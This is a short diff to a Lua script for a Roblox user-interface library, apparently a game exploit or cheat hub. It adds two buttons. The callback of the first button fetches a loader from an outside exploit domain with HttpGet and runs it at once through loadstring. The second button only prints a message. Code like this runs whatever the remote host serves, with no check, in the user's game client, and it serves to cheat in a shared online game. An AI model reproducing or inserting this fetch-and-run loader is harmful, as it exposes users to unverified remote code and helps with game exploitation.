@@ -493,3 +493,30 @@ local Section = Tab:AddSection({
 --[[
 Name = <string> - The name of the section.
 ]]
+
+Tab:AddButton({
+	Name = "Ef hub (but forsaken)",
+	Callback = function()
+ loadstring(game:HttpGet(
+"https://cdn.exploitingis.fun/loader"
+))()
+      		print("button pressed")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddButton({
+	Name = "prosaken ahh",
+	Callback = function()
+      		print("button pressed")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
